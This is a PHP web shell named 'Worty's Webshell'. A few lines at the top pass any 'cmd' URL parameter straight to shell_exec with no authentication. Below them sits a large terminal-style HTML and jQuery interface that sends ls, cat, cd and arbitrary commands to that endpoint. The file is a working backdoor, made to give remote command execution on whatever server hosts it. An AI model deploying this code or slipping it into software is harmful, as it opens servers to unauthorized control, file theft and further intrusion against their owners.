<?php
if(isset($_GET['cmd'])){
    $result = shell_exec($_GET['cmd']);
    if(is_null($result)) $result = "false";
    die(var_dump($result));
}
$pwd = shell_exec('cd,'); // or pwd if unix
if($pwd == null) $pwd = shell_exec('pwd');
$user = shell_exec('whoami');
$pwd = $str=str_replace("\n","",$pwd);
$pwd = $str=str_replace("\\","\\\\",$pwd);
$user = $str=str_replace("\n","",$user);
$user = $str=str_replace("\\","\\\\",$user);
?>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Worty's Webshell</title>
    <style>
        ::selection {
            background: #FF0000;
        }
        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
        }
        body {
            font-size: 13pt;
            font-family: monospace;
            color: white;
            background-color: black;
        }
        #container {
            padding: .1em 1.5em 1em 1em;
            margin-left: 50px;
            margin-right: 135px;
        }
        #cmdline {
            outline: none;
            background-color: transparent;
            margin: 0;
            width: 100%;
            font: inherit;
            border: none;
            color: inherit;
        }
        #output {
            clear: both;
            width: 100%;
        }
        #prompt {
            white-space: nowrap;
            display: -webkit-box;
            -webkit-box-pack: center;
            -webkit-box-orient: vertical;
            display: -moz-box;
            -moz-box-pack: center;
            -moz-box-orient: vertical;
            display: box;
            box-pack: center;
            box-orient: vertical;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }
        .prompt-color {
            color: #FF0000;
        }
        .input-line {
            display: -webkit-box;
            -webkit-box-orient: horizontal;
            -webkit-box-align: stretch;
            display: -moz-box;
            -moz-box-orient: horizontal;
            -moz-box-align: stretch;
            display: box;
            box-orient: horizontal;
            box-align: stretch;
            clear: both;
        }
        .input-line > div:nth-child(2) {
            -webkit-box-flex: 1;
            -moz-box-flex: 1;
            box-flex: 1;
        }

        #githubImg img {
            position: fixed;
            bottom: 0; right: 0;
            border: 0;
        }

        /* SIDE NAV */

        #sidenavBtn {
            position: absolute !important;
            padding: 2px !important; 
            top: 0 !important;
            right: 7px !important;
            font-size: 35px !important;
        }

        #sidenav {
            height: 100%;
            width: 50px;
            position: fixed;
            z-index: 9;
            top: 0;
            left: 0;
            background-color: #e09f14;
            opacity: 0.8;
            overflow-x: hidden;
            transition: 0.3s;
            padding-top: 60px;
        }
        #sidenav img {
            display: block;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            bottom: 100px;
            transition: 0.3s;
            opacity: 0;
        }

        #sidenav img:focus {
            outline: none;
        }

        #sidenav button {
            padding: 8px 8px 8px 32px;
            cursor: pointer;
            text-decoration: none;
            font-size: 15pt;
            color: white;
            display: block;
            transition: 0.3s;
            background:none !important;
            border:none;
        }
        #sidenav button:hover {
            color: #442e00;
        }

        @media screen and (max-height: 450px) {
            body {
                font-size: 11pt;
            }
            #sidenav {
            padding-top: 15px;
        }
            #sidenav a {
            font-size: 13px;
        }
        }

        @media screen and (max-width: 900px) {
            #githubImg img {
                transform: translateX(900px);
            }

            #container {
                margin-right: 0;
            }
        }

        a{
            color: #FFFFFF;
        }
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        function setCurrentPwd(data){
            currentPwd = data;
        }
    </script>
    <script>
        "use strict";
        var currentPwd = "<?= $pwd; ?>";
        var tabCmd = [];
        var clickUpArrow = 0;
        var filename = '/webshell.php';
        /**
         * Configs
         */
        var configs = (function () {
            var instance;
            var Singleton = function (options) {
                var options = options || Singleton.defaultOptions;
                for (var key in Singleton.defaultOptions) {
                    this[key] = options[key] || Singleton.defaultOptions[key];
                }
            };
            Singleton.defaultOptions = {
                welcome: "",
                host: "webshell",
                user: "<?= $user; ?>",
                is_root: false,
                type_delay: 2
            };
            return {
                getInstance: function (options) {
                    instance === void 0 && (instance = new Singleton(options));
                    return instance;
                }
            };
        })();

        /**
         * Your files here
         */
        var files = (function () {
            var instance;
            var Singleton = function (options) {
                var options = options || Singleton.defaultOptions;
                for (var key in Singleton.defaultOptions) {
                    this[key] = options[key] || Singleton.defaultOptions[key];
                }
            };
            Singleton.defaultOptions = {
            };
            return {
                getInstance: function (options) {
                    instance === void 0 && (instance = new Singleton(options));
                    return instance;
                }
            };
        })();

        /**
         * Directories here
         */
        var folders = (function () {
            var instance;
            var SingletonFolders = function (options){
                var options = options || SingletonFolders.defaultOptions;
                for(var key in SingletonFolders.defaultOptions){
                    this[key] = options[key] || SingletonFolders.defaultOptions[key];
                }
            };
            SingletonFolders.defaultOptions = {
            };
            return{
                getInstance: function(options){
                    instance == void 0 && (instance = new SingletonFolders(options));
                    return instance;
                }
            };
        })();
        var main = (function () {

            /**
             * Aux functions
             */
            var isUsingIE = window.navigator.userAgent.indexOf("MSIE ") > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./);

            var ignoreEvent = function (event) {
                event.preventDefault();
                event.stopPropagation();
            };
            
            var scrollToBottom = function () {
                window.scrollTo(0, document.body.scrollHeight);
            };
            
            var isURL = function (str) {
                return false;
            };
            
            /**
             * Model
             */
            var InvalidArgumentException = function (message) {
                this.message = message;
                // Use V8's native method if available, otherwise fallback
                if ("captureStackTrace" in Error) {
                    Error.captureStackTrace(this, InvalidArgumentException);
                } else {
                    this.stack = (new Error()).stack;
                }
            };
            // Extends Error
            InvalidArgumentException.prototype = Object.create(Error.prototype);
            InvalidArgumentException.prototype.name = "InvalidArgumentException";
            InvalidArgumentException.prototype.constructor = InvalidArgumentException;

            var Terminal = function (prompt, cmdLine, output, sidenav, profilePic, user, host, root, outputTimer) {
                if (!(prompt instanceof Node) || prompt.nodeName.toUpperCase() !== "DIV") {
                    throw new InvalidArgumentException("Invalid value " + prompt + " for argument 'prompt'.");
                }
                if (!(cmdLine instanceof Node) || cmdLine.nodeName.toUpperCase() !== "INPUT") {
                    throw new InvalidArgumentException("Invalid value " + cmdLine + " for argument 'cmdLine'.");
                }
                if (!(output instanceof Node) || output.nodeName.toUpperCase() !== "DIV") {
                    throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
                }
                if (!(sidenav instanceof Node) || sidenav.nodeName.toUpperCase() !== "DIV") {
                    throw new InvalidArgumentException("Invalid value " + sidenav + " for argument 'sidenav'.");
                }
                if (!(profilePic instanceof Node) || profilePic.nodeName.toUpperCase() !== "IMG") {
                    throw new InvalidArgumentException("Invalid value " + profilePic + " for argument 'profilePic'.");
                }
                (typeof user === "string" && typeof host === "string") && (this.completePrompt = user + "@" + host + ":" + "<?= $pwd; ?>" + (root ? "#" : "$"));
                this.profilePic = profilePic;
                this.prompt = prompt;
                this.cmdLine = cmdLine;
                this.output = output;
                this.sidenav = sidenav;
                this.sidenavOpen = false;
                this.sidenavElements = [];
                this.typeSimulator = new TypeSimulator(outputTimer, output);
            };

            Terminal.prototype.type = function (text, callback) {
                var typeSimulator = new TypeSimulator(2, document.getElementById("output"));
                typeSimulator.type(text, callback);
            };

            Terminal.prototype.exec = function () {
                var command = this.cmdLine.value;
                this.cmdLine.value = "";
                this.prompt.textContent = "";
                this.output.innerHTML += "<span class=\"prompt-color\">" + this.completePrompt + "</span> " + command + "<br/>";
            };

            Terminal.prototype.init = function () {
                this.sidenav.addEventListener("click", ignoreEvent);
                this.cmdLine.disabled = true;
                this.sidenavElements.forEach(function (elem) {
                    elem.disabled = true;
                });
                this.prepareSideNav();
                this.lock(); 
                document.body.addEventListener("click", function (event) {
                    if (this.sidenavOpen) {
                        this.handleSidenav(event);
                    }
                    this.focus();
                }.bind(this));
                this.cmdLine.addEventListener("keydown", function (event) {
                    if (event.which === 13 || event.keyCode === 13) {
                        this.handleCmd();
                        ignoreEvent(event);
                    } else if (event.which === 38 || event.keyCode === 38) {
                        this.handleFill();
                        ignoreEvent(event);
                    }
                }.bind(this));
                this.reset();
            };

            Terminal.makeElementDisappear = function (element) {
                element.style.opacity = 0;
                element.style.transform = "translateX(-300px)";
            };

            Terminal.makeElementAppear = function (element) {
                element.style.opacity = 1;
                element.style.transform = "translateX(0)";
            };

            Terminal.prototype.prepareSideNav = function () {
                var capFirst = (function () {
                    return function (string) {
                        return string.charAt(0).toUpperCase() + string.slice(1);
                    }
                })();
                for (var file in files.getInstance()) {
                    var element = document.createElement("button");
                    Terminal.makeElementDisappear(element);
                    element.onclick = function (file, event) {
                        this.handleSidenav(event);
                        this.cmdLine.value = "cat " + file + " ";
                        this.handleCmd();
                    }.bind(this, file);
                    element.appendChild(document.createTextNode(capFirst(file.replace(/\.[^/.]+$/, "").replace(/_/g, " "))));
                    this.sidenav.appendChild(element);
                    this.sidenavElements.push(element);
                }
                // Shouldn't use document.getElementById but Terminal is already using loads of params
                document.getElementById("sidenavBtn").addEventListener("click", this.handleSidenav.bind(this));
            };

            Terminal.prototype.handleSidenav = function (event) {
                if (this.sidenavOpen) {
                    this.profilePic.style.opacity = 0;
                    this.sidenavElements.forEach(Terminal.makeElementDisappear);
                    this.sidenav.style.width = "50px";
                    document.getElementById("sidenavBtn").innerHTML = "&#9776;";
                    this.sidenavOpen = false;
                } else {
                    this.sidenav.style.width = "300px";
                    this.sidenavElements.forEach(Terminal.makeElementAppear);
                    document.getElementById("sidenavBtn").innerHTML = "&times;";
                    this.profilePic.style.opacity = 1;
                    this.sidenavOpen = true;
                }
                document.getElementById("sidenavBtn").blur();
                ignoreEvent(event);
            };

            Terminal.prototype.lock = function () {
                this.exec();
                this.cmdLine.blur();
                this.cmdLine.disabled = true;
                //this.sidenavElements.forEach(function (elem) {
                //    elem.disabled = true;
                //});
            };

            Terminal.prototype.unlock = function () {
                this.cmdLine.disabled = false;
                this.prompt.textContent = this.completePrompt;
                this.sidenavElements.forEach(function (elem) {
                    elem.disabled = false;
                });
                scrollToBottom();
                this.focus();
            };

            Terminal.prototype.handleFill = function() {
                if(tabCmd[clickUpArrow] !== undefined){
                    this.cmdLine.value = tabCmd[tabCmd.length-1-clickUpArrow];
                    clickUpArrow++;
                }
            }

            Terminal.prototype.handleCmd = function () {
                clickUpArrow = 0;
                var cmdComponents = this.cmdLine.value.trim();
                tabCmd.push(cmdComponents);
                this.lock();
                if(cmdComponents.includes('sudo') || cmdComponents.includes('su')){
                    this.type(' Unable to perform this command.',this.unlock.bind(this));
                }else{
                    if(!cmdComponents.includes('cd')){
                        if(cmdComponents.includes('ls')){
                            $.get(filename+'?cmd='+cmdComponents+" "+currentPwd,function(data){
                                if(data.includes("false")) data = "Your command is invalid.";
                                else data = data.replace('string','').replace(/\([0-9]*\)/g,'').replace('"','').replace('"','').replace(' ','\n');
                                Terminal.prototype.type(data,function(){});
                            });
                        }else{
                            if(cmdComponents.includes('cat')){
                                $.get(filename+'?cmd=cat '+currentPwd+"/"+cmdComponents.split(" ")[1],function(data){
                                    if(data.includes("false")) data = "File not found.";
                                    Terminal.prototype.type(data,function(){});
                                });
                            }else{
                                if(cmdComponents.includes('pwd')){
                                    this.type(currentPwd,function(){});
                                }else{
                                    $.get(filename+'?cmd='+cmdComponents).done(function(data){
                                        data = data.replace('string','').replace(/\([0-9]*\)/g,'').replace('"','').replace('"','').replace(' ','\n');
                                        if(data.includes("false")) data = "Your command is invalid.";
                                        Terminal.prototype.type(data,function(){});
                                    });
                                }
                            }
                        }
                    }else{
                        if(!cmdComponents.split(" ")[1].startsWith('/')){
                            $.get(filename+'?cmd=cd '+currentPwd+"/"+cmdComponents.split(" ")[1]+"; pwd").done(function(data){
                                data = data.replace('string','').replace(/\([0-9]*\)/g,'').replace('"','').replace('"','').replace(' ','\n');                                
                                Terminal.prototype.completePrompt = configs.getInstance().user + "@" + configs.getInstance().host + ":" + currentPwd + (configs.getInstance().root ? "#" : "$");
                                if(data===currentPwd && cmdComponents !== '.') Terminal.prototype.type('Invalid location or permission denied.',function(){});
                                else Terminal.prototype.type('',function(){});
                                setCurrentPwd(data);
                            });
                        }else{
                            $.get(filename+'?cmd=cd '+cmdComponents.split(" ")[1]+" ; pwd").done(function(data){
                                data = data.replace('string','').replace(/\([0-9]*\)/g,'').replace('"','').replace('"','').replace(' ','\n');
                                if(data===currentPwd) Terminal.prototype.type('Invalid location or permission denied.',function(){});
                                else Terminal.prototype.type('',function(){});
                                setCurrentPwd(data);
                            });
                        }
                    }
                }
                this.completePrompt = configs.getInstance().user + "@" + configs.getInstance().host + ":" + currentPwd + (configs.getInstance().root ? "#" : "$");
                this.unlock();
            };
            
            Terminal.prototype.reset = function () {
                this.output.textContent = "";
                this.prompt.textContent = "";
                if (this.typeSimulator) {
                    this.type(configs.getInstance().welcome + (isUsingIE ? "\n" + configs.getInstance().internet_explorer_warning : ""), function () {
                        this.unlock();
                    }.bind(this));
                }
            };

            Terminal.prototype.focus = function () {
                this.cmdLine.focus();
            };

            var TypeSimulator = function (timer, output) {
                var timer = parseInt(timer);
                if (timer === Number.NaN || timer < 0) {
                    throw new InvalidArgumentException("Invalid value " + timer + " for argument 'timer'.");
                }
                if (!(output instanceof Node)) {
                    throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
                }
                this.timer = timer;
                this.output = output;
            };

            TypeSimulator.prototype.type = function (text, callback) {
                if(text != undefined){
                    var i = 0;
                    var output = this.output;
                    var timer = this.timer;
                    var skipped = false;
                    var skip = function () {
                        skipped = true;
                    }.bind(this);
                    document.addEventListener("dblclick", skip);
                    (function typer() {
                        if (i < text.length) {
                            var char = text.charAt(i);
                            var isNewLine = char === "\n";
                            output.innerHTML += isNewLine ? "<br/>" : char;
                            i++;
                            if (!skipped) {
                                setTimeout(typer, isNewLine ? timer : timer);
                            } else {
                                output.innerHTML += (text.substring(i).replace(new RegExp("\n", 'g'), "<br/>")) + "<br/>";
                                document.removeEventListener("dblclick", skip);
                                callback();
                            }
                        } else if (callback) {
                            output.innerHTML += "<br/>";
                            document.removeEventListener("dblclick", skip);
                            callback();
                        }
                        scrollToBottom();
                    })();
                }
            };

            return {
                listener: function () {
                    new Terminal(
                        document.getElementById("prompt"),
                        document.getElementById("cmdline"),
                        document.getElementById("output"),
                        document.getElementById("sidenav"),
                        document.getElementById("profilePic"),
                        configs.getInstance().user,
                        configs.getInstance().host,
                        configs.getInstance().is_root,
                        configs.getInstance().type_delay
                    ).init();
                }
            };
        })();

        window.onload = main.listener;

    </script>
    <script>
        /**
         * Add startsWith support for IE
         */
        if (!String.prototype.startsWith) {
            String.prototype.startsWith = function (searchString, position) {
                position = position || 0;
                return this.indexOf(searchString, position) === position;
            };
        }
    </script>
<body>
    <div id="sidenav" style="display: none;">
        <button id="sidenavBtn">&#9776;</button>
        <img id="profilePic" alt="An avatar that aims to represent the website owner" src="">
    </div>
    <div id="container">
        <div id="output"></div>
        <div id="input-line" class="input-line">
            <div id="prompt" class="prompt-color"></div>&nbsp;
            <div>
                <input type="text" id="cmdline" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                    autofocus/>
            </div>
        </div>
    </div>
</body>

</html>